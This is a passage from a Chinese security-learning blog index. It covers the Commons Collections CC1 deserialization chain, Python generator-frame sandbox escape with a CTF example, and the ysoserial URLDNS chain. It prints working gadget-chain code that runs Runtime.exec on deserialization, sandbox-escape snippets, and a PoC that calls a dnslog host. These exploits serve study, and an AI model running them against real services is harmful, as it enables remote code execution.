但发现这个构造方法前面没有public属性，那么就是default类型。在java中，default类型只能在本包进行调用。说明这个类只能在sun.reflect.annotation这个包下被调用。 我们要想在外部调用，需要用到反射来解决，进行构造: package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,t); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:4","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"三个问题 当然这样是还调用不到setValue方法的，有两个if条件。而且就算调用了发现setVlaue参数是固定的，我们还根本没有把Runtime.getRuntime()这个参数传进去，而且Runtime.getRuntime()也不能进行序列化，因为Runtime没有序列化接口。 总结一下这里的几个问题： **一、**Runtime的序列化 **二、**setValue参数的改变 **三、**两个if条件的绕过 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:5","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决Runtime的序列化 因为Runtime是没有反序列化接口的的，所以其不能进行反序列化，但是可以把其变回原型类class，这个是存在serilize接口的： 在利用反射来调用其方法，下面是其反射调用的demo： public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Runtime runtime = (Runtime) c1.getMethod(\"getRuntime\",null).invoke(null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }不过这种写法下面照着改InvokerTransformer.tansform调用时不好对照，所以换一种详细的写法。 public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Method getruntime = c1.getMethod(\"getRuntime\",null); Runtime runtime=(Runtime) getruntime.invoke(null,null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }然后利用InvokerTransformer.tansform来进行代替反射进行调用，因为需要InvokerTransformer.tansform来调用危险函数嘛。 import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1test { public static void main(String[] args)throws Exception { Method getruntime=(Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class); Runtime runtime=(Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getruntime); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); } }分析构造，这里其实就可以把new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);看作是调用Runtime.class的getMethod方法，参数是(\"getRuntime\",null)。 剩下的如法炮制。 但是这样要一个个嵌套创建参数太麻烦了(当然也必须这么改)，这里我们想起上面一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法: 再通俗一点讲就是上面说过的会把前一次的输出当作下一次的输入，这里transform的参数也就是上一次的输出，所以非常符合当前这种情况。 构造： import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; new ChainedTransformer(transformers).transform(Runtime.class);简单分析一下就是建立一个数组把刚刚transform函数前面不同的值储存起来待会循环调用。然后只需传入参数Runtime.class就行了。 那么解决了Runtime反序列化的问题，现在先加上反序列化的代码： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//静态方法调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IO","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:6","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决if条件 上面代码运行肯定是弹不了计算机的。看看调用setValue的地方： 先不说setValue()方法的参数不是我们想要的，这里还有两个if条件，第一个if是要memberType != null，先看memberType是什么： Class\u003c?\u003e memberType = memberTypes.get(name);而这里的name就是键值对中的建，memberTypes： Map\u003cString, Class\u003c?\u003e\u003e memberTypes = annotationType.memberTypes();这个就是注解中成员变量的名称，但是上面的Override没有成员变量。换一个注解，这里用到Target 其成员变量名称是value，所以把key设为value。再次进行调试： 发现第二个if直接就符合条件了，顺利来到了setValue()，不过这里还是简单分析一下第二个if条件： 就是判断value是否是memberType和ExceptionProxy类型的实例，这里value传的是aaa字符串肯定实不符和。所以直接调用到了最后一步setValue方法。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:7","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决setValue参数 到这里在理一遍思路，先把上面的代码粘下来： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//静态方法调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }首先是通过InvokerTransformer类的transform方法来反射调用Runtime.getRuntime的exec方法执行危险命令。 后面由于需要Runtime序列化，所以要利用Runtime.class来一步一步调用到危险函数（也就是选调用到getRuntime方法然后再调用到exec方法）所以连续用了几次InvokerTransformer类的transform方法。但是后面序列化肯定只有Runtime.class一个参数传进去，所以又利用了ChainedTransformer类。它的transform方法可以实现迭代调用transform方法，这样就只用传入Runtime.class就可以直接执行到最后的calc了（当然这是手动调用）。 然后就是利用TransformedMap类checkSetValue方法来调用ChainedTransformer类的transform，在这之前，利用TransformedMap.decorate静态方法来实现TransformedMap类的实例化主要需要调用其构造方法让参数valueTransformer的值等于ChainedTransformer，这样checkSetValue才能算是调用ChainedTransformer的transform方法， 但由于这里checkSetValue是保护属性，所以又要利用MapEntry类的setValue方法来调用checkSetValue方法，由于MapEntry是个子类且其继承了Map.Entry接口可以在使用上面Map遍历的形式调用到MapEntry类的setValue方法（这是手动） 最后发现AnnotationInvocationHandler类中的readObject方法中刚好有这个Map遍历，至此到readObject就算完成了最后一个类，虽然其是defualt属性，但还是可以利用反射来达到调用。到这里只需要解决最后一个问题，就是setValue的参数问题，因为这个setValue的参数也就是最后transform的参数。 发现前面提到的类ConstantTransformer可以把接受的任何参数都返回一个常量并且常量可控。 那么构造： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"value\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:8","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"总结 主要的函数调用就是： transform —-\u003echeckSetValue —-\u003e setValue —-\u003e readObject 只是其中穿插了一些其他需要解决的问题。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:4:0","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["漏洞学习"],"content":"一、生成器 生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。 在 Python 中，生成器可以通过两种方式创建： 1、生成器函数：定义一个函数，使用 yield 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 示例： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() print(next(gen)) # 第一次调用，输出 1 print(next(gen)) # 第二次调用，输出 2 print(next(gen)) # 第三次调用，输出 32、生成器表达式：使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 示例： gen = (x * x for x in range(5)) print(list(gen)) # 输出 [0, 1, 4, 9, 16]","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:1","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"二、栈帧(frame) 在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。 栈帧包含了以下几个重要的属性： f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。 f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。 f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。 f_lasti: 整数，表示最后执行的字节码指令的索引。 f_back: 指向上一级调用栈帧的引用，用于构建调用栈。 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:2","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"三、生成器的属性 gi_code: 生成器对应的code对象。 gi_frame: 生成器对应的frame（栈帧）对象。 gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。 gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。 gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。 着重介绍一下 gi_frame 属性 gi_frame 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。 例子： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # 获取生成器的当前帧信息 frame = gen.gi_frame # 输出生成器的当前帧信息 print(\"Local Variables:\", frame.f_locals) print(\"Global Variables:\", frame.f_globals) print(\"Code Object:\", frame.f_code) print(\"Instruction Pointer:\", frame.f_lasti)同理利用gi_code属性也可以获得生成器的相关代码对象属性： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # 获取生成器的当前代码信息 code = gen.gi_code # 输出生成器的当前代码信息 print( code.co_name) print(code.co_code) print( code.co_consts) print(code.co_filename)","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:3","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"四、利用栈帧沙箱逃逸 原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表 一个简单的例子： s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_globals['s3cret'] #返回并获取前一级栈帧的globals print(b) b=waff()或者： s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals print(b) b=waff()为什么都行呢，可以把frame这个栈帧对象打印看看： 分别是： \u003cframe at 0x0000020F97255040, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\测试\\\\1.py', line 9, code waff\u003e \u003cframe at 0x00000176546465B0, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\测试\\\\1.py', line 13, code \u003cmodule\u003e\u003e在看看上面的f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。 不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。 在给个例子： s3cret=\"this is flag\" codes=''' def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals return b b=waff() ''' locals={} code = compile(codes, \"test\", \"exec\") exec(code,locals) print(locals[\"b\"])运行结果： 这个其实得从下向上看，最先的帧是exec，然后是b=，最后是8line那里的代码。一步一步回到全局变量 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:4","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"五、简单绕过 next过滤可以用list，send，和生成器表达式进行绕过， yield过滤也可以用生成器表达式进行绕过 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:5","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"六、例题 2024L3HCTF import sys import os codes=''' \u003c\u003ccodehere\u003e\u003e ''' try: codes.encode(\"ascii\") except UnicodeEncodeError: exit(0) if \"__\" in codes: print(\"__ bypass!!\") exit(0) codes+=\"\\nres=factorization(c)\" print(codes) locals={\"c\":\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\",\"__builtins__\": None} res=set() def blackFunc(oldexit): def func(event, args): blackList = [\"process\",\"os\",\"sys\",\"interpreter\",\"cpython\",\"open\",\"compile\",\"__new__\",\"gc\"] for i in blackList: if i in (event + \"\".join(str(s) for s in args)).lower(): print(\"noooooooooo\") print(i) oldexit(0) return func code = compile(codes, \"\u003cjudgecode\u003e\", \"exec\") sys.addaudithook(blackFunc(os._exit)) exec(code,{\"__builtins__\": None},locals) print(locals) p=int(locals[\"res\"][0]) q=int(locals[\"res\"][1]) if(p\u003e1e5 and q\u003e1e5 and p*q==int(\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\")): print(\"Correct!\",end=\"\") else: print(\"Wrong!\",end=\"\")就是可以执行一些命令，满足下面的if条件就行。 做了一些过滤，过滤掉了双下划线，{\"__builtins__\": None} 置空了__builtins__。 这里的if条件是：首先p和q都得大于100000，其次就是p和q的积为int(“69…97863”) 按照题目要求，如果通过算法在要求的5秒实现基本上是不可能的，但是我们可以通过沙箱外的globals的__builtins__字段去修改int函数，实现绕过if语句，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals。 由于这里的{\"__builtins__\": None} 置空了__builtins__，那么就无法使用next()和send()了。但还可以使用生成器的表达式，为什么必须用生成器，主要还是因为它的属性gi_frame可以获得当前栈帧对象，当然sys._getframe()等也可以获得栈帧对象，不过需要引入sys模块。 用生成器的表达式获得栈帧对象 a=(a.gi_frame.f_back.f_back for i in [1]) print(a) a=[x for x in a][0] print(a)简单解释一下：看来上面的生成器表达式这里其实就是，先执行i=1，然后执行a.gi_frame.f_back.f_back，这里并没有用到生成器的特性，只是单纯利用生成器来获得栈帧属性。 a=[x for x in a][0]等价于next(a)和list(a)，就是迭代执行嘛。至于两个f_back是从下依次向上返回。 \u003cframe at 0x000001C18B6BA130, file 'D:\\\\yinwenmingtwo\\\\Pyt","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:6","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["javasec"],"content":"配置调试ysoserial 下载项目ysoserial：https://github.com/frohoff/ysoserial idea打开，在pom.xml下载好需要用的所有依赖。下载依赖的时候一定要把配置文件全勾上： 下载完成，看到没有报错后，就可以开始调试ysoserial了。在 pom.xml 中找到入口类： 跟踪入口类，右键点击调试发现只会打印uage信息： 这是因为我们没有传入参数，需要进行调试配置： 然后再次点击调试，发现序列化成功(呃，上面的地址需要加个http://头)： 然后就可以通过打断点对ysoserial的URLDNS链进行调试了。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:1:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"URLDNS链分析 URLDNS 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点： 不限制jdk版本，使用Java内置类，对第三方依赖没有要求 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞 URLDNS利用链，只能发起DNS请求，并不能进行其他利用 学了前面的java序列化，我们知道了要想利用反序列化漏洞就得要重写readObject，不然连最基本的反序列化都做不到。 ysoserial在URLDNS.java中已经写出了利用链： Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode()先看URLDNS.java类（属于ysoserial工具自己的类）： 这个类继承了一个泛型为对象的接口，然后第一步先实例化了一个handler，SilentURLStreamHandler这个类继承了URLStreamHandler，并重写openConnection和getHostAddress方法返回空，这个作用后面在说。 之后创建hashMap、URL对象，然后将URL对象，也就是DnsLog的地址put进hashmap（这个put方法后面在跟进细说）。 然后通过反射调用重置hashCode的值为-1，再返回（作后面再说）。 可以看出：最终的payload结构是一个HashMap，里面包含了 一个修改了HashCode为-1的URL类。 跟进到HashMap类 可以看到HashMap是个泛型可以接受类，并且继承了Serializable接口，可以实现序列化和反序列化。 反序列化时会调用readObject函数，搜索发现这里重写的readObject()函数。 红框上面的就是一些对传入数据的检测，方法中最关键的就是红框部分，可以看出通过反序列化取出了k和v并对其调用putVal方法。 跟进行putVal方法没有什么好看的，就是把k和v放入table中。 回到readObject的putVal方法里面还调用了hash方法处理我们传入key。 跟进hash()，看到这个方法的内容并不多。 会先判断key是否为空，不是空就调用hashCode来获取值的哈希码（即生成哈希值）。这里让 key 为 URL 对象，那么key.hashCode()调用URL类中的hashCode方法：java.net.URL#hashCode，跟进一下。 如果hashCode不等于-1则直接返回，表示已经算过了，否则就调用handler类里面的hashCode方法。上面可以看到hashCode默认就是-1。 那么可以跟进handler的hashCode方法， getHostAddress是获取ip地址，跟进一下getHostAddress方法，到达最终利用场景。 可以看到其逻辑，判断是否有主机名，有就直接返回，没有就执行getByName触发解析然后返回。 那么链子主要的就这些了，但怎么感觉这个链子似乎和我们的payload没有关系呢。确实没有关系，这里分析的URLDNS链是利用链也就是说可以传入payload到readObject进行利用最后会造成DNS解析。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:2:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserial生成payload分析 这里生成paylaod是进行的序列化，利用的writeObject方法来把url进行序列化，从上面的URLDNS类不难看到其调用了hashMap的put方法，跟进put方法： 发现也是putVal方法，后面的就和readObject中一样了，会对url进行解析。但为什么在生成payload时明明调用了put方法却在DNSlog并没有收到请求呢。 回到最开始说的，发现重写了openConnection和getHostAddress方法使其返回为空，在调试时从put方法步过也可以看到直接到了return null，所以上面重写的目的就是为了防止在生成payload时发起DNS解析，至于重写openConnection方法的作用是实现类必须实现父类的所有抽象方法。但是如果看到我下面进行验证时会发现readObject在调用时为什么又会进行解析。 其实具体调用哪个类的getHostAddress方法是由handler来看的，跟进hanlder发现put时的handler是： 而在反序列化时，URLStreamHandler是由transient修饰的，被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler，所以最后还是调用的URLStreamHandler的getHostAddress方法。 那么生成payload时把hashCode设为-1又是为什么呢。这是因为在前面HashMap#put时已经调用过一次hashCode()函数，hashCode的值会改变不再为-1，那么进行漏洞验证传入readObject时就会直接返回HashCode值了。所以还得利用反射来让hashCode变为-1。 综上怎么感觉put这么麻烦又会触发dns解析又会让hashCode不为-1，就不能去掉吗？ 这里就要看进行序列化时重写的writeObject方法了： 看到就是将对象的默认序列化写入到输出流和将 buckets 变量的值和size变量的值写入到输出流。还有就是有个自定义的方法，跟进看看： 可以发现它让tab值等于table值，然后从中取出键值进行序列化。那么这个table是哪来的呢？ 就是put方法中的putVal改变的。所以需要调用put方法才能成功序列化。至于反序列就和table没有关系了，就是正常的进行反序列化拿到kv值。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:3:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserial验证整条URLDNS链子 最后可以利用PayloadRunner.run()来进行一次完成的利用。 配置好参数后开始条调试： 继续向下运行，可以看到对payload进行了序列化， 调用的序列化函数writeObject是hashMap重写后的 继续向下，接下来要进行的是反序列化。 跟进发现调用的就是hashMap的readObject方法。 readObject后面的内容我们就熟悉了，上面也说了readObject下面调用的getHostAddress就是URLStreamHandler类的，所以最后执行会有一次解析，在dnslog平台可以看到。 至此工具ysoserial的由生成payload到执行payload的链子就这样了。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:4:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"poc链调试 如果把ysoserial的整个URLDNS链理清楚了，其实就可以自己编写payload进行调试了。 poc： import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); //创建HashMap的对象hashMap URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); //创建URL对象，含有我们的url Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); //反射调用私有变量hashCode f.setAccessible(true); //使私有变量能够被修改 f.set(url, 10086); 